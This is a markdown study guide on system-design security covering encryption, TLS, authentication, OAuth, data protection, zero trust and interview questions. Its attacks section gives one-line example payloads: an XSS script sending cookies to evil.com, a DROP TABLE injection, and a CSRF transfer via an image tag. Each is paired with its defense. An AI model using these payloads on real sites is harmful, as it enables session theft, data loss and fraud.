# Security

## Table of Contents

1. [Overview](#1-overview)
2. [Encryption](#2-encryption)
3. [TLS/SSL](#3-tlsssl)
4. [Authentication](#4-authentication)
5. [Authorization](#5-authorization)
6. [OAuth 2.0 and OpenID Connect](#6-oauth-20-and-openid-connect)
7. [Common Attacks and Defenses](#7-common-attacks-and-defenses)
8. [Data Protection](#8-data-protection)
9. [Infrastructure Security](#9-infrastructure-security)
10. [Security in Microservices](#10-security-in-microservices)
11. [Key Takeaways](#11-key-takeaways)

---

## 1. Overview

Security in system design is about protecting data confidentiality, integrity, and
availability (the CIA triad). It's not a feature you bolt on at the end — it must be
designed into the system from the start.

### CIA Triad

```
         Confidentiality
             /    \
            /      \
           /        \
    Integrity ──── Availability
```

| Property        | Definition                                    | Example Threat                 |
|-----------------|-----------------------------------------------|--------------------------------|
| Confidentiality | Only authorized parties can access data       | Data breach, eavesdropping     |
| Integrity       | Data is not tampered with                     | Man-in-the-middle, SQL injection|
| Availability    | System is accessible when needed              | DDoS attack, ransomware        |

### Defense in Depth

Don't rely on a single security layer. Multiple overlapping defenses:

```
┌──────────────────────────────────────────────────────────┐
│  Network Security (firewalls, WAF, DDoS protection)      │
│  ┌────────────────────────────────────────────────────┐  │
│  │  Transport Security (TLS, mTLS)                    │  │
│  │  ┌──────────────────────────────────────────────┐  │  │
│  │  │  Application Security (auth, input validation)│  │  │
│  │  │  ┌────────────────────────────────────────┐   │  │  │
│  │  │  │  Data Security (encryption at rest,     │   │  │  │
│  │  │  │  access controls, audit logs)           │   │  │  │
│  │  │  └────────────────────────────────────────┘   │  │  │
│  │  └──────────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

---

## 2. Encryption

### Symmetric Encryption

Same key for encryption and decryption. Fast but key distribution is the challenge.

```
Plaintext ──[Key]──► Ciphertext ──[Same Key]──► Plaintext

Algorithms:
  AES-256     — Current standard, used everywhere
  ChaCha20    — Fast in software (mobile), used by TLS 1.3
  3DES        — Legacy, being phased out
```

**Use for**: Encrypting data at rest, bulk data encryption.

### Asymmetric Encryption

Key pair: public key (anyone can encrypt) + private key (only owner can decrypt).

```
                    Public Key (shared with everyone)
Plaintext ──────────────────────────────────► Ciphertext
                                                 │
                    Private Key (kept secret)     │
Plaintext ◄──────────────────────────────────────┘

Algorithms:
  RSA (2048/4096-bit) — Widely used, well-understood
  ECDSA / ECDH        — Shorter keys, same security, faster
  Ed25519              — Modern, fast, secure
```

**Use for**: Key exchange, digital signatures, TLS handshake.

### Hashing

One-way function. Cannot reverse a hash back to the original data.

```
Input ──[Hash Function]──► Hash Digest (fixed length)

"password123" ──[SHA-256]──► "ef92b778bafe771e89245b89ecbc08a44a4e166c..."

Properties:
  - Deterministic: same input → same output
  - One-way: can't reverse hash to input
  - Avalanche: tiny input change → completely different hash
  - Collision-resistant: hard to find two inputs with same hash
```

| Algorithm | Digest Size | Use Case                              |
|-----------|-------------|---------------------------------------|
| SHA-256   | 256 bits    | Data integrity, certificates          |
| SHA-3     | Variable    | Alternative to SHA-2 family           |
| bcrypt    | 184 bits    | Password hashing (includes salt + work factor) |
| Argon2    | Variable    | Password hashing (memory-hard, newest standard) |
| MD5       | 128 bits    | DEPRECATED — collision attacks found  |
| SHA-1     | 160 bits    | DEPRECATED — collision attacks found  |

### Password Hashing

**Never store passwords in plaintext. Never use a fast hash (SHA-256) for passwords.**

```python
# WRONG — fast hash, no salt
hash = sha256(password)  # Vulnerable to rainbow tables

# WRONG — fast hash with salt
hash = sha256(salt + password)  # Still too fast, GPU can brute-force

# RIGHT — slow, adaptive hash with built-in salt
import bcrypt
hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# bcrypt automatically:
#   1. Generates a random salt
#   2. Applies 2^12 (4096) rounds of hashing
#   3. Stores salt + hash together

# ALSO RIGHT — Argon2 (newer, recommended)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hash = ph.hash(password)
```

The "work factor" makes it computationally expensive to brute-force.
bcrypt (rounds=12) takes ~250ms per hash — fine for login, terrible for attackers.

---

## 3. TLS/SSL

TLS (Transport Layer Security) encrypts data in transit between client and server.

### TLS Handshake (TLS 1.3 — simplified)

```
Client                              Server
  │                                    │
  │──── Client Hello ────────────────►│
  │     (supported ciphers,           │
  │      key share)                   │
  │                                    │
  │◄─── Server Hello ────────────────│
  │     (chosen cipher,               │
  │      key share,                   │
  │      certificate,                 │
  │      finished)                    │
  │                                    │
  │──── Finished ────────────────────►│
  │                                    │
  │◄═══ Encrypted Data ═════════════►│
  │                                    │

TLS 1.3: 1 round trip (1-RTT) — or 0-RTT for resumed connections
TLS 1.2: 2 round trips (2-RTT)
```

### Certificate Chain

```
Root CA (Certificate Authority)
  │ Signs
  ├── Intermediate CA
  │     │ Signs
  │     └── Your Server Certificate
  │           (*.example.com)
  │
  Browsers trust ~100 root CAs.
  Your server sends its cert + intermediate cert.
  Browser verifies chain up to a trusted root CA.
```

### TLS Best Practices

| Practice                          | Recommendation                       |
|-----------------------------------|--------------------------------------|
| TLS version                       | TLS 1.3 (or minimum TLS 1.2)        |
| Certificate                       | From a trusted CA (Let's Encrypt = free) |
| Cipher suites                     | AES-256-GCM or ChaCha20-Poly1305    |
| HSTS header                       | Strict-Transport-Security: max-age=31536000 |
| Certificate pinning               | For mobile apps, pin specific certs  |
| OCSP stapling                     | Faster certificate revocation checks |

### mTLS (Mutual TLS)

Standard TLS: only the server presents a certificate.
mTLS: **both** client and server present certificates.

```
Client                              Server
  │                                    │
  │──── Client Hello ────────────────►│
  │◄─── Server Hello + Server Cert ──│
  │──── Client Cert ─────────────────►│   ← Client also proves identity
  │◄─── Verify client cert ──────────│
  │                                    │
  │◄═══ Encrypted Data ═════════════►│

Use case: Service-to-service authentication in microservices.
Both sides verify each other's identity cryptographically.
```

---

## 4. Authentication

Authentication = proving who you are. "Are you who you claim to be?"

### Authentication Methods Comparison

| Method           | Security  | Complexity | Use Case                     |
|------------------|-----------|------------|------------------------------|
| API Key          | Low       | Low        | Server-to-server, internal   |
| Session Cookie   | Medium    | Medium     | Traditional web apps         |
| JWT Bearer Token | Medium    | Medium     | SPAs, mobile, microservices  |
| OAuth 2.0        | High      | High       | Third-party access           |
| mTLS             | Very High | High       | Service-to-service           |
| Passkeys/WebAuthn| Very High | Medium     | Modern passwordless auth     |

### Session-Based Auth

```
1. User logs in:
   POST /login {username, password}
   
2. Server creates session:
   Session ID → stored in server-side session store (Redis, DB)
   Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

3. Subsequent requests:
   Browser automatically sends cookie.
   Server looks up session ID in store → gets user info.

4. Logout:
   Delete session from store. Set-Cookie: session_id=; Max-Age=0.
```

### Token-Based Auth (JWT)

```
1. User logs in:
   POST /login {username, password}

2. Server creates JWT:
   {
     "header": {"alg": "RS256", "typ": "JWT"},
     "payload": {"sub": "user_123", "exp": 1700003600, "roles": ["admin"]},
     "signature": RSA_SIGN(header + payload, private_key)
   }
   Response: {"access_token": "eyJ...", "refresh_token": "..."}

3. Subsequent requests:
   Authorization: Bearer eyJ...
   Server verifies signature + expiration.
   No session store needed (stateless).

4. Token expiry:
   Use refresh token to get a new access token.
```

### Session vs JWT

| Factor           | Session Cookies              | JWT                            |
|------------------|------------------------------|--------------------------------|
| State            | Server-side (stateful)       | Client-side (stateless)        |
| Scalability      | Needs shared session store   | No server storage needed       |
| Revocation       | Easy (delete from store)     | Hard (need blocklist)          |
| Size             | Just a session ID (small)    | Can be large (carries claims)  |
| CSRF vulnerable  | Yes (cookie auto-sent)       | No (manually attached)         |
| XSS risk         | HttpOnly protects cookie     | If stored in localStorage, XSS danger |
| Best for         | Server-rendered web apps     | SPAs, mobile, microservices    |

---

## 5. Authorization

Authorization = what are you allowed to do? "You've proven who you are — now can you access this resource?"

### RBAC (Role-Based Access Control)

```
Roles:
  admin  → [create, read, update, delete, manage_users]
  editor → [create, read, update]
  viewer → [read]

Check:
  if user.role has permission "delete" → allow
  else → 403 Forbidden
```

Simple but coarse-grained. A user either has a role or doesn't.

### ABAC (Attribute-Based Access Control)

```
Policy: Allow if
  user.department == resource.department AND
  user.clearance_level >= resource.classification AND
  current_time is within business_hours

Example:
  User: {department: "engineering", clearance: "secret"}
  Resource: {department: "engineering", classification: "confidential"}
  → clearance "secret" >= "confidential" → ALLOW
```

More flexible, more complex. Can encode arbitrary policies.

### ReBAC (Relationship-Based Access Control)

Permissions based on the relationship between user and resource.

```
Google Docs model:
  Document "budget.xlsx"
    owner: Alice
    editor: Bob
    viewer: Engineering team

  Can Bob edit? → Yes (Bob is an editor)
  Can Carol view? → Is Carol in Engineering team? → Yes → Allow
  Can Dave edit? → No relationship → Deny
```

Used by: Google (Zanzibar), Auth0 FGA, SpiceDB.

---

## 6. OAuth 2.0 and OpenID Connect

### OAuth 2.0 — Authorization

OAuth 2.0 lets a user grant a third-party app limited access to their resources
**without sharing their password**.

**Example**: "Allow FitnessApp to read your Google Calendar" — you authorize
FitnessApp to access your calendar without giving it your Google password.

### OAuth 2.0 Grant Types

| Grant Type          | Use Case                                    |
|---------------------|---------------------------------------------|
| Authorization Code  | Web apps, most secure                       |
| Authorization Code + PKCE | SPAs, mobile apps (no client secret)  |
| Client Credentials  | Machine-to-machine (no user involved)       |
| Device Code         | Smart TVs, CLI tools (limited input devices)|
| ~~Implicit~~        | DEPRECATED — use Auth Code + PKCE instead   |
| ~~Password~~        | DEPRECATED — sends password to client app   |

### Authorization Code Flow with PKCE

```
1. App generates code_verifier (random string) and 
   code_challenge = SHA256(code_verifier)

2. User ──► App ──► Auth Server
   GET /authorize?
     response_type=code
     &client_id=app123
     &redirect_uri=https://app.com/callback
     &scope=read:calendar
     &code_challenge=SHA256_HASH
     &code_challenge_method=S256

3. User logs in at Auth Server, approves scope

4. Auth Server redirects to callback with authorization code:
   https://app.com/callback?code=AUTH_CODE_HERE

5. App exchanges code for tokens:
   POST /token
     grant_type=authorization_code
     &code=AUTH_CODE_HERE
     &code_verifier=ORIGINAL_RANDOM_STRING  ← proves identity
     &client_id=app123
     &redirect_uri=https://app.com/callback

6. Auth Server returns tokens:
   {
     "access_token": "...",
     "refresh_token": "...",
     "id_token": "...",        ← only with OpenID Connect
     "expires_in": 3600,
     "token_type": "Bearer"
   }
```

### OpenID Connect (OIDC) — Authentication

OAuth 2.0 is for **authorization** (what can you access).
OIDC is a layer on top of OAuth for **authentication** (who are you).

OIDC adds:
- **ID Token** (JWT with user identity claims)
- **UserInfo endpoint** (to fetch user profile)
- **Standard scopes**: `openid`, `profile`, `email`

```
Regular OAuth: "FitnessApp can access your calendar"
OIDC + OAuth:  "FitnessApp can access your calendar AND knows you are alice@gmail.com"
```

---

## 7. Common Attacks and Defenses

### SQL Injection

```
Vulnerable:
  query = f"SELECT * FROM users WHERE name = '{user_input}'"
  Input: "'; DROP TABLE users; --"
  → SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

Defense: Parameterized queries
  cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
  → The input is treated as data, never as SQL code.
```

### Cross-Site Scripting (XSS)

```
Stored XSS:
  User submits: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
  This gets stored in the database and rendered to other users.

Defense:
  1. Escape output: Convert < to &lt;, > to &gt;
  2. Content Security Policy (CSP) header
  3. HttpOnly cookies (JavaScript can't access them)
  4. Use a framework that auto-escapes (React, Angular)
```

### Cross-Site Request Forgery (CSRF)

```
Attack:
  1. User is logged into bank.com (has session cookie)
  2. User visits evil.com
  3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
  4. Browser sends request to bank.com WITH the session cookie!

Defense:
  1. CSRF tokens (random token in forms, verified server-side)
  2. SameSite cookie attribute (SameSite=Strict or Lax)
  3. Check Origin/Referer headers
  4. Use JWT in Authorization header (not cookies)
```

### DDoS (Distributed Denial of Service)

```
Types:
  Volumetric: Flood bandwidth (UDP flood, DNS amplification)
  Protocol: Exploit protocol weaknesses (SYN flood)
  Application: Overwhelm app logic (HTTP flood, slowloris)

Defense Layers:
  1. CDN / Edge (CloudFlare, AWS Shield) — absorbs volumetric attacks
  2. Rate limiting — stops application-layer floods
  3. WAF (Web Application Firewall) — blocks malicious patterns
  4. Auto-scaling — absorb traffic spikes
  5. Anycast routing — distribute traffic across global PoPs
```

### OWASP Top 10 (2021) Summary

| # | Category                          | Key Defense                           |
|---|-----------------------------------|---------------------------------------|
| 1 | Broken Access Control             | Server-side authorization checks      |
| 2 | Cryptographic Failures            | Use TLS, bcrypt/Argon2, AES-256       |
| 3 | Injection (SQL, NoSQL, OS, LDAP)  | Parameterized queries, input validation|
| 4 | Insecure Design                   | Threat modeling, secure design patterns|
| 5 | Security Misconfiguration         | Harden defaults, disable unused features|
| 6 | Vulnerable Components             | Keep dependencies updated (Dependabot) |
| 7 | Auth Failures                     | MFA, rate limit login, no default creds|
| 8 | Software/Data Integrity Failures  | Verify signatures, secure CI/CD       |
| 9 | Logging & Monitoring Failures     | Centralized logging, alerting         |
|10 | Server-Side Request Forgery (SSRF)| Validate/sanitize URLs, network policies|

---

## 8. Data Protection

### Encryption at Rest

```
Application ──► write data ──► Encrypted on disk

Methods:
  1. Full Disk Encryption (FDE): Encrypt entire disk (BitLocker, LUKS)
  2. Database-level: TDE (Transparent Data Encryption) — MySQL, PostgreSQL, SQL Server
  3. Application-level: Encrypt sensitive fields before storing
     
     user.ssn = encrypt(ssn, key)  → stored encrypted
     ssn = decrypt(user.ssn, key)  → decrypted on read
  
  4. Cloud KMS: AWS KMS, GCP KMS, Azure Key Vault
     → Managed encryption keys, automatic rotation, audit logging
```

### Key Management

| Practice                   | Description                                          |
|----------------------------|------------------------------------------------------|
| Never hardcode keys        | Use environment variables or secrets manager         |
| Rotate keys regularly      | 90-day rotation for most, shorter for high-sensitivity|
| Use a KMS                  | AWS KMS, HashiCorp Vault, GCP KMS, Azure Key Vault  |
| Envelope encryption        | Encrypt data with a data key, encrypt data key with master key |
| Principle of least privilege| Only services that need a key should have access     |

### PII (Personally Identifiable Information)

| Data Type         | Protection                                          |
|-------------------|-----------------------------------------------------|
| Passwords         | Hash with bcrypt/Argon2 (never encrypt)             |
| SSN, Credit Card  | Encrypt at rest, mask in logs (***-**-1234)         |
| Email, Phone      | Encrypt at rest if required by regulation           |
| IP address        | May be PII under GDPR                              |
| Access logs       | Retain only as long as needed, then delete          |

---

## 9. Infrastructure Security

### Network Security

```
┌─────────────────────────────────────────────────────┐
│                        VPC                           │
│                                                      │
│  Public Subnet                Private Subnet         │
│  ┌──────────────┐            ┌──────────────┐       │
│  │  Load        │            │  App Servers │       │
│  │  Balancer    │──────────►│              │       │
│  │  (ALB)       │            │  Database    │       │
│  └──────────────┘            │  (no public  │       │
│         ▲                    │   IP)        │       │
│         │                    └──────────────┘       │
│  ┌──────┴───────┐            ┌──────────────┐       │
│  │  WAF         │            │  NAT Gateway │       │
│  │  (Web App    │            │  (outbound   │       │
│  │   Firewall)  │            │   only)      │       │
│  └──────────────┘            └──────────────┘       │
│                                                      │
│  Security Groups:                                    │
│    ALB: Allow 80, 443 from 0.0.0.0/0                │
│    App: Allow 8080 from ALB security group ONLY      │
│    DB:  Allow 5432 from App security group ONLY      │
└─────────────────────────────────────────────────────┘
```

### Secrets Management

```
BAD:
  # config.py
  DATABASE_URL = "postgres://admin:password123@db.example.com/mydb"
  AWS_SECRET_KEY = "AKIAIOSFODNN7EXAMPLE"

GOOD:
  # Use environment variables
  DATABASE_URL = os.environ["DATABASE_URL"]
  
  # Or use a secrets manager
  secret = aws_secrets_manager.get_secret("prod/database")
  
  # Or use HashiCorp Vault
  vault_client.read("secret/data/database")
```

**Tools**: AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager, Azure Key Vault, Doppler.

### Zero Trust Architecture

Traditional: Trust everything inside the network ("castle and moat").
Zero Trust: **Trust nothing, verify everything**, regardless of network location.

Principles:
1. Never trust, always verify
2. Least privilege access
3. Assume breach — limit blast radius
4. Verify explicitly — every request is authenticated and authorized
5. Micro-segmentation — isolate services, don't allow lateral movement

---

## 10. Security in Microservices

### Service-to-Service Authentication

```
Options:

1. mTLS (strongest):
   Service A ◄──mTLS──► Service B
   Both present certificates. Managed by service mesh (Istio, Linkerd).

2. JWT with service identity:
   Service A ──► Auth Server ──► Get service token
   Service A ──► Service B (Authorization: Bearer <service_jwt>)

3. API keys (simplest, least secure):
   Service A ──► Service B (X-API-Key: <shared_key>)
```

### JWT Propagation in Microservices

```
User ──[JWT]──► API Gateway ──[JWT]──► Service A ──[JWT]──► Service B
                    │
              Validates JWT,
              adds claims,
              passes to services

User JWT claims:
  {"sub": "user_123", "roles": ["admin"], "tenant": "acme"}

Each service can:
  1. Verify the JWT signature (don't need to call auth server)
  2. Check claims for authorization
  3. Pass the JWT to downstream services
```

### Security Checklist for Production

```
□ TLS 1.3 everywhere (in-transit encryption)
□ Encryption at rest for all data stores
□ Passwords hashed with bcrypt/Argon2
□ No secrets in code or config files (use secrets manager)
□ Rate limiting on all public endpoints
□ Input validation on all endpoints
□ Parameterized queries (no SQL injection)
□ CORS properly configured
□ Security headers set (CSP, HSTS, X-Content-Type-Options)
□ Authentication on all endpoints (except public)
□ Authorization checks at every layer
□ Audit logging for sensitive operations
□ Dependency scanning (Snyk, Dependabot)
□ Regular penetration testing
□ Incident response plan documented
```

---

## 11. Key Takeaways

### Golden Rules

1. **Encrypt everything in transit** (TLS 1.3) and **at rest** (AES-256).
2. **Never store plaintext passwords.** Use bcrypt or Argon2.
3. **Use parameterized queries everywhere.** SQL injection is still the #1 attack.
4. **Secrets belong in a secrets manager,** not in code or environment files.
5. **Apply the principle of least privilege** — every component gets minimum access.
6. **Defense in depth** — no single layer is sufficient.
7. **OAuth 2.0 + PKCE** for user authorization. **mTLS or JWT** for service-to-service.
8. **Monitor and alert** — you can't defend against what you can't see.

### Quick Reference

```
Authentication: Who are you?
  → JWT, session cookies, OAuth, mTLS

Authorization: What can you do?
  → RBAC, ABAC, ReBAC

Encryption at rest: Protect stored data
  → AES-256, TDE, KMS

Encryption in transit: Protect data in flight
  → TLS 1.3

Password storage: Store securely
  → bcrypt (rounds=12+) or Argon2

API security: Protect endpoints
  → Rate limiting, input validation, auth, CORS

Infrastructure: Protect the perimeter
  → VPC, security groups, WAF, DDoS protection
```

---

## 🔥 Senior Interview Questions

1. An interviewer says: "We use HTTPS, so our API is secure." What are all the ways an API can still be vulnerable despite TLS? Walk through at least 5 threats (SSRF, broken auth, injection, etc.). [Answer](QnA-Answer-Key.md#16-security)

2. Compare authentication approaches for a system with users, admin dashboard, mobile app, and third-party API consumers: session cookies, JWT, OAuth 2.0, API keys, and mTLS. Which would you use for each and why? [Answer](QnA-Answer-Key.md#16-security)

3. You discover that your application stores passwords using MD5. Walk through the migration strategy to bcrypt/Argon2 without forcing all users to reset their passwords. [Answer](QnA-Answer-Key.md#16-security)

4. Your REST API is vulnerable to a BOLA (Broken Object Level Authorization) attack — users can access other users' data by changing the ID in the URL. How do you fix this at the application level, API gateway level, and database level? [Answer](QnA-Answer-Key.md#16-security)

5. An attacker is sending 10 million requests/second to your login endpoint (DDoS). Walk through your defense layers: edge protection (Cloudflare/AWS Shield), rate limiting, CAPTCHAs, and account lockout policies. What are the trade-offs of each? [Answer](QnA-Answer-Key.md#16-security)

6. Explain the difference between authentication, authorization, and access control. Your system uses JWTs for auth. An employee leaves the company. How do you revoke their access if JWTs are stateless? Compare short-lived tokens, token blacklists, and reference tokens. [Answer](QnA-Answer-Key.md#16-security)

7. You're designing a multi-tenant SaaS platform where tenant data must be completely isolated. Compare row-level security, schema-per-tenant, and database-per-tenant. How does your security testing strategy differ for each? [Answer](QnA-Answer-Key.md#16-security)

8. An interviewer asks: "How do you handle secrets management?" Walk through the evolution from hardcoded secrets → environment variables → vault (HashiCorp Vault, AWS Secrets Manager). How do you handle secret rotation without downtime? [Answer](QnA-Answer-Key.md#16-security)

9. Your system needs to be compliant with GDPR (right to erasure) and SOC 2. How does this affect your database design, logging strategy, and data pipeline architecture? Can you truly delete data from event-sourced systems? [Answer](QnA-Answer-Key.md#16-security)

10. Explain zero-trust security architecture. Your company's network was breached through a compromised VPN. How does zero-trust (verify every request, mTLS, microsegmentation) prevent lateral movement compared to the traditional perimeter-based model? [Answer](QnA-Answer-Key.md#16-security)

---

## 📚 Further Reading

- [OWASP Top 10 (latest)](https://owasp.org/www-project-top-ten/) — The industry-standard list of critical web application security risks.
- [API Security Checklist (GitHub)](https://github.com/shieldfy/API-Security-Checklist) — Practical checklist for securing REST and GraphQL APIs.
- [How Netflix Secures Their Platform (YouTube)](https://www.youtube.com/watch?v=YCOKsCrmqSE) — Netflix's approach to security at massive scale.
